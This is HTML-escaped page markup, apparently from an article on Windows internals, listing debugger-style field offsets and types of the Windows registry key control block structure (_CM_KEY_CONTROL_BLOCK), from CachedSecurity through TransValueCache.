 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x058&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;CachedSecurity&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_KEY_SECURITY_CACHE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x060&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ValueList&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CHILD_LIST&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x068&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;LinkTarget&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_KEY_CONTROL_BLOCK&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x070&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;IndexHint&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_INDEX_HINT_BLOCK&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x070&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;HashKey&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x070&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;SubKeyCount&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x078&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KeyBodyListHead&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_LIST_ENTRY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x078&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ClonedListEntry&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_LIST_ENTRY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x088&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KeyBodyArray&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;[4]&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_KEY_BODY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0a8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KcbLastWriteTime&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_LARGE_INTEGER&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0b0&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KcbMaxNameLen&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0b2&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KcbMaxValueNameLen&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0b4&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KcbMaxValueDataLen&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0b8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KcbUserFlags&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0b8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KcbVirtControlFlags&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;4,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0b8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KcbDebug&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;8,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0b8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;16,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0bc&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Spare3&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0c0&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;LayerInfo&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_KCB_LAYER_INFO&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0c8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;RealKeyName&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Char&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0d0&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KCBUoWListHead&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_LIST_ENTRY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0e0&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;DelayQueueEntry&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_LIST_ENTRY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0e0&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Stolen&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;UChar&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0f0&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;TransKCBOwner&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_TRANS&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x0f8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KCBLock&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_INTENT_LOCK&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x108&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KeyLock&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_INTENT_LOCK&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x118&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;TransValueCache&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CHILD_LIST&lt;/span&gt;&lt;/p&gt;
